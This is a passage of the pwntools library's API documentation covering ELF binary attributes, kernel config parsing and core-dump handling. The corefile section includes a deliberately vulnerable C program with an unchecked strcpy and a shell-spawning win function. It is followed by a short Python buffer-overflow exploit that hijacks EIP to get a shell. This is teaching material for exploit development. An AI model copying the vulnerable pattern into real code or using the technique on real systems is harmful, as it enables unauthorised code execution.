<dt id="pwnlib.elf.elf.ELF.relro">
<code class="descname">relro</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.relro" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary uses RELRO protections.</p>
<p>This requires both presence of the dynamic tag <code class="docutils literal"><span class="pre">DT_BIND_NOW</span></code>, and
a <code class="docutils literal"><span class="pre">GNU_RELRO</span></code> program header.</p>
<p>The <a class="reference external" href="https://refspecs.linuxbase.org/elf/elf.pdf">ELF Specification</a> describes how the linker should resolve
symbols immediately, as soon as a binary is loaded.  This can be
emulated with the <code class="docutils literal"><span class="pre">LD_BIND_NOW=1</span></code> environment variable.</p>
<blockquote>
<div><p><code class="docutils literal"><span class="pre">DT_BIND_NOW</span></code></p>
<p>If present in a shared object or executable, this entry instructs
the dynamic linker to process all relocations for the object
containing this entry before transferring control to the program.
The presence of this entry takes precedence over a directive to use
lazy binding for this object when specified through the environment
or via <code class="docutils literal"><span class="pre">dlopen(BA_LIB)</span></code>.</p>
<p>(<a class="reference external" href="https://refspecs.linuxbase.org/elf/elf.pdf#page=81">page 81</a>)</p>
</div></blockquote>
<p>Separately, an extension to the GNU linker allows a binary to specify
a <a class="reference external" href="https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic.html#PROGHEADER">PT_GNU_RELRO</a> program header, which describes the <em>region of memory
which is to be made read-only after relocations are complete.</em></p>
<p>Finally, a new-ish extension which doesn&#8217;t seem to have a canonical
source of documentation is <a class="reference external" href="http://refspecs.linuxbase.org/elf/gabi4+/ch5.dynamic.html#df_bind_now">DF_BIND_NOW</a>, which has supposedly superceded
<code class="docutils literal"><span class="pre">DT_BIND_NOW</span></code>.</p>
<blockquote>
<div><p><code class="docutils literal"><span class="pre">DF_BIND_NOW</span></code></p>
<p>If set in a shared object or executable, this flag instructs the
dynamic linker to process all relocations for the object containing
this entry before transferring control to the program. The presence
of this entry takes precedence over a directive to use lazy binding
for this object when specified through the environment or via
<code class="docutils literal"><span class="pre">dlopen(BA_LIB)</span></code>.</p>
</div></blockquote>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">path</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">elf</span><span class="o">.</span><span class="n">relro</span><span class="o">.</span><span class="n">path</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;test-*&#39;</span><span class="p">)):</span>
<span class="gp">... </span>    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
<span class="gp">... </span>    <span class="n">expected</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">test</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
<span class="gp">... </span>    <span class="n">actual</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">relro</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
<span class="gp">... </span>    <span class="k">assert</span> <span class="n">actual</span> <span class="o">==</span> <span class="n">expected</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.rpath">
<code class="descname">rpath</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.rpath" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary has an <code class="docutils literal"><span class="pre">RPATH</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.runpath">
<code class="descname">runpath</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.runpath" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary has a <code class="docutils literal"><span class="pre">RUNPATH</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.rwx_segments">
<code class="descname">rwx_segments</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.rwx_segments" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; List of all segments which are writeable and executable.</p>
<dl class="docutils">
<dt>See:</dt>
<dd><a class="reference internal" href="#pwnlib.elf.elf.ELF.segments" title="pwnlib.elf.elf.ELF.segments"><code class="xref py py-attr docutils literal"><span class="pre">ELF.segments</span></code></a></dd>
</dl>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.sections">
<code class="descname">sections</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.sections" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; A list of <code class="xref py py-class docutils literal"><span class="pre">elftools.elf.sections.Section</span></code> objects
for the segments in the ELF.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.segments">
<code class="descname">segments</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.segments" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; A list of <code class="xref py py-class docutils literal"><span class="pre">elftools.elf.segments.Segment</span></code> objects
for the segments in the ELF.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.start">
<code class="descname">start</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.start" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Address of the entry point for the ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.statically_linked">
<code class="descname">statically_linked</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.statically_linked" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="docutils literal"><span class="pre">True</span></code> if the ELF is a statically linked executable</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.sym">
<code class="descname">sym</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.sym" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.dotdict" title="pwnlib.elf.elf.dotdict"><code class="xref py py-class docutils literal"><span class="pre">dotdict</span></code></a> &#8211; Alias for <a class="reference internal" href="#pwnlib.elf.elf.ELF.symbols" title="pwnlib.elf.elf.ELF.symbols"><code class="xref py py-attr docutils literal"><span class="pre">ELF.symbols</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.symbols">
<code class="descname">symbols</code><em class="property"> = {}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.symbols" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.dotdict" title="pwnlib.elf.elf.dotdict"><code class="xref py py-class docutils literal"><span class="pre">dotdict</span></code></a> of <code class="docutils literal"><span class="pre">name</span></code> to <code class="docutils literal"><span class="pre">address</span></code> for all symbols in the ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.ubsan">
<code class="descname">ubsan</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.ubsan" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary was built with
Undefined Behavior Sanitizer (<code class="docutils literal"><span class="pre">UBSAN</span></code>).</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.version">
<code class="descname">version</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.version" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">tuple</span></code> &#8211; Linux kernel version, if this is a Linux kernel image</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.writable_segments">
<code class="descname">writable_segments</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.writable_segments" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; List of all segments which are writeable.</p>
<dl class="docutils">
<dt>See:</dt>
<dd><a class="reference internal" href="#pwnlib.elf.elf.ELF.segments" title="pwnlib.elf.elf.ELF.segments"><code class="xref py py-attr docutils literal"><span class="pre">ELF.segments</span></code></a></dd>
</dl>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.elf.elf.Function">
<em class="property">class </em><code class="descclassname">pwnlib.elf.elf.</code><code class="descname">Function</code><span class="sig-paren">(</span><em>name</em>, <em>address</em>, <em>size</em>, <em>elf=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.Function" title="Permalink to this definition">¶</a></dt>
<dd><p>Encapsulates information about a function in an <a class="reference internal" href="#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">ELF</span></code></a> binary.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of the function</li>
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the function</li>
<li><strong>size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the function, in bytes</li>
<li><strong>elf</strong> (<a class="reference internal" href="index.html#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><em>ELF</em></a>) &#8211; Encapsulating ELF object</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="attribute">
<dt id="pwnlib.elf.elf.Function.address">
<code class="descname">address</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.Function.address" title="Permalink to this definition">¶</a></dt>
<dd><p>Address of the function in the encapsulating ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.Function.elf">
<code class="descname">elf</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.Function.elf" title="Permalink to this definition">¶</a></dt>
<dd><p>Encapsulating ELF object</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.Function.name">
<code class="descname">name</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.Function.name" title="Permalink to this definition">¶</a></dt>
<dd><p>Name of the function</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.Function.size">
<code class="descname">size</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.Function.size" title="Permalink to this definition">¶</a></dt>
<dd><p>Size of the function, in bytes</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.elf.elf.dotdict">
<em class="property">class </em><code class="descclassname">pwnlib.elf.elf.</code><code class="descname">dotdict</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.dotdict" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper to allow dotted access to dictionary elements.</p>
<p>Is a real <a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a> object, but also serves up keys as attributes
when reading attributes.</p>
<p>Supports recursive instantiation for keys which contain dots.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">x</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">elf</span><span class="o">.</span><span class="n">elf</span><span class="o">.</span><span class="n">dotdict</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">isinstance</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nb">dict</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span><span class="p">[</span><span class="s1">&#39;foo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span><span class="o">.</span><span class="n">foo</span>
<span class="go">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span><span class="p">[</span><span class="s1">&#39;bar.baz&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span><span class="o">.</span><span class="n">bar</span><span class="o">.</span><span class="n">baz</span>
<span class="go">4</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-elf/config"></span><div class="section" id="module-pwnlib.elf.config">
<span id="pwnlib-elf-config-kernel-config-parsing"></span><h5><a class="reference internal" href="#module-pwnlib.elf.config" title="pwnlib.elf.config"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf.config</span></code></a> &#8212; Kernel Config Parsing<a class="headerlink" href="#module-pwnlib.elf.config" title="Permalink to this headline">¶</a></h5>
<p>Kernel-specific ELF functionality</p>
<dl class="function">
<dt id="pwnlib.elf.config.parse_kconfig">
<code class="descclassname">pwnlib.elf.config.</code><code class="descname">parse_kconfig</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/config.py#L198-261"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.config.parse_kconfig" title="Permalink to this definition">¶</a></dt>
<dd><p>Parses configuration data from a kernel .config.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Configuration contents.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A <a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a>  mapping configuration options.
&#8220;Not set&#8221; is converted into <code class="docutils literal"><span class="pre">None</span></code>, <code class="docutils literal"><span class="pre">y</span></code> and <code class="docutils literal"><span class="pre">n</span></code> are converted
into <a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a>.  Numbers are converted into <a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a>.
All other values are as-is.
Each key has <code class="docutils literal"><span class="pre">CONFIG_</span></code> stripped from the beginning.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">parse_kconfig</span><span class="p">(</span><span class="s1">&#39;FOO=3&#39;</span><span class="p">)</span>
<span class="go">{&#39;FOO&#39;: 3}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">parse_kconfig</span><span class="p">(</span><span class="s1">&#39;FOO=y&#39;</span><span class="p">)</span>
<span class="go">{&#39;FOO&#39;: True}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">parse_kconfig</span><span class="p">(</span><span class="s1">&#39;FOO=n&#39;</span><span class="p">)</span>
<span class="go">{&#39;FOO&#39;: False}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">parse_kconfig</span><span class="p">(</span><span class="s1">&#39;FOO=bar&#39;</span><span class="p">)</span>
<span class="go">{&#39;FOO&#39;: &#39;bar&#39;}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">parse_kconfig</span><span class="p">(</span><span class="s1">&#39;# FOO is not set&#39;</span><span class="p">)</span>
<span class="go">{&#39;FOO&#39;: None}</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-elf/corefile"></span><div class="section" id="module-pwnlib.elf.corefile">
<span id="pwnlib-elf-corefile-core-files"></span><h5><a class="reference internal" href="#module-pwnlib.elf.corefile" title="pwnlib.elf.corefile"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf.corefile</span></code></a> &#8212; Core Files<a class="headerlink" href="#module-pwnlib.elf.corefile" title="Permalink to this headline">¶</a></h5>
<p>Read information from Core Dumps.</p>
<p>Core dumps are extremely useful when writing exploits, even outside of
the normal act of debugging things.</p>
<div class="section" id="using-corefiles-to-automate-exploitation">
<h6>Using Corefiles to Automate Exploitation<a class="headerlink" href="#using-corefiles-to-automate-exploitation" title="Permalink to this headline">¶</a></h6>
<p>For example, if you have a trivial buffer overflow and don&#8217;t want to
open up a debugger or calculate offsets, you can use a generated core
dump to extract the relevant information.</p>
<div class="highlight-c"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;sh&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="highlight-shell"><div class="highlight"><pre><span></span>$ gcc crash.c -m32 -o crash -fno-stack-protector
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Generate a cyclic pattern so that we can auto-find the offset</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>

<span class="c1"># Run the process once so that it crashes</span>
<span class="n">process</span><span class="p">([</span><span class="s1">&#39;./crash&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Get the core dump</span>
<span class="n">core</span> <span class="o">=</span> <span class="n">Coredump</span><span class="p">(</span><span class="s1">&#39;./core&#39;</span><span class="p">)</span>

<span class="c1"># Our cyclic pattern should have been used as the crashing address</span>
<span class="k">assert</span> <span class="n">pack</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span> <span class="ow">in</span> <span class="n">payload</span>

<span class="c1"># Cool! Now let&#39;s just replace that value with the address of &#39;win&#39;</span>
<span class="n">crash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./crash&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span>
    <span class="n">cyclic_find</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">eip</span><span class="p">):</span> <span class="n">crash</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">win</span>
<span class="p">})</span>

<span class="c1"># Get a shell!</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./crash&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
<span class="k">print</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="c1"># uid=1000(user) gid=1000(user) groups=1000(user)</span>
</pre></div>
</div>
</div>
<div class="section" id="module-members">
<h6>Module Members<a class="headerlink" href="#module-members" title="Permalink to this headline">¶</a></h6>
<dl class="class">
<dt id="pwnlib.elf.corefile.Corefile">
<em class="property">class </em><code class="descclassname">pwnlib.elf.corefile.</code><code class="descname">Corefile</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.elf.elf.ELF</span></code></a></p>
<p>Enhances the inforation available about a corefile (which is an extension
of the ELF format) by permitting extraction of information about the mapped
data segments, and register state.</p>
<p>Registers can be accessed directly, e.g. via <code class="docutils literal"><span class="pre">core_obj.eax</span></code> and enumerated
via <a class="reference internal" href="#pwnlib.elf.corefile.Corefile.registers" title="pwnlib.elf.corefile.Corefile.registers"><code class="xref py py-data docutils literal"><span class="pre">Corefile.registers</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>core</strong> &#8211; Path to the core file.  Alternately, may be a <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a> instance,
and the core file will be located automatically.</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">Corefile</span><span class="p">(</span><span class="s1">&#39;./core&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">eax</span><span class="p">)</span>
<span class="go">&#39;0xfff5f2e0&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">registers</span>
<span class="go">{&#39;eax&#39;: 4294308576,</span>
<span class="go"> &#39;ebp&#39;: 1633771891,</span>
<span class="go"> &#39;ebx&#39;: 4151132160,</span>
<span class="go"> &#39;ecx&#39;: 4294311760,</span>
<span class="go"> &#39;edi&#39;: 0,</span>
<span class="go"> &#39;edx&#39;: 4294308700,</span>
<span class="go"> &#39;eflags&#39;: 66050,</span>
<span class="go"> &#39;eip&#39;: 1633771892,</span>
<span class="go"> &#39;esi&#39;: 0,</span>
<span class="go"> &#39;esp&#39;: 4294308656,</span>
<span class="go"> &#39;orig_eax&#39;: 4294967295,</span>
<span class="go"> &#39;xcs&#39;: 35,</span>
<span class="go"> &#39;xds&#39;: 43,</span>
<span class="go"> &#39;xes&#39;: 43,</span>
<span class="go"> &#39;xfs&#39;: 0,</span>
<span class="go"> &#39;xgs&#39;: 99,</span>
<span class="go"> &#39;xss&#39;: 43}</span>
</pre></div>
</div>
<p>Mappings can be iterated in order via <a class="reference internal" href="#pwnlib.elf.corefile.Corefile.mappings" title="pwnlib.elf.corefile.Corefile.mappings"><code class="xref py py-attr docutils literal"><span class="pre">Corefile.mappings</span></code></a>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">Corefile</span><span class="p">(</span><span class="s1">&#39;./core&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">mappings</span>
<span class="go">[Mapping(&#39;/home/user/pwntools/crash&#39;, start=0x8048000, stop=0x8049000, size=0x1000, flags=0x5),</span>
<span class="go"> Mapping(&#39;/home/user/pwntools/crash&#39;, start=0x8049000, stop=0x804a000, size=0x1000, flags=0x4),</span>
<span class="go"> Mapping(&#39;/home/user/pwntools/crash&#39;, start=0x804a000, stop=0x804b000, size=0x1000, flags=0x6),</span>
<span class="go"> Mapping(None, start=0xf7528000, stop=0xf7529000, size=0x1000, flags=0x6),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/libc-2.19.so&#39;, start=0xf7529000, stop=0xf76d1000, size=0x1a8000, flags=0x5),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/libc-2.19.so&#39;, start=0xf76d1000, stop=0xf76d2000, size=0x1000, flags=0x0),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/libc-2.19.so&#39;, start=0xf76d2000, stop=0xf76d4000, size=0x2000, flags=0x4),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/libc-2.19.so&#39;, start=0xf76d4000, stop=0xf76d5000, size=0x1000, flags=0x6),</span>
<span class="go"> Mapping(None, start=0xf76d5000, stop=0xf76d8000, size=0x3000, flags=0x6),</span>
<span class="go"> Mapping(None, start=0xf76ef000, stop=0xf76f1000, size=0x2000, flags=0x6),</span>
<span class="go"> Mapping(&#39;[vdso]&#39;, start=0xf76f1000, stop=0xf76f2000, size=0x1000, flags=0x5),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/ld-2.19.so&#39;, start=0xf76f2000, stop=0xf7712000, size=0x20000, flags=0x5),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/ld-2.19.so&#39;, start=0xf7712000, stop=0xf7713000, size=0x1000, flags=0x4),</span>
<span class="go"> Mapping(&#39;/lib/i386-linux-gnu/ld-2.19.so&#39;, start=0xf7713000, stop=0xf7714000, size=0x1000, flags=0x6),</span>
<span class="go"> Mapping(&#39;[stack]&#39;, start=0xfff3e000, stop=0xfff61000, size=0x23000, flags=0x6)]</span>
</pre></div>
</div>
<p class="rubric">Example</p>
<p>The Linux kernel may not overwrite an existing core-file.</p>
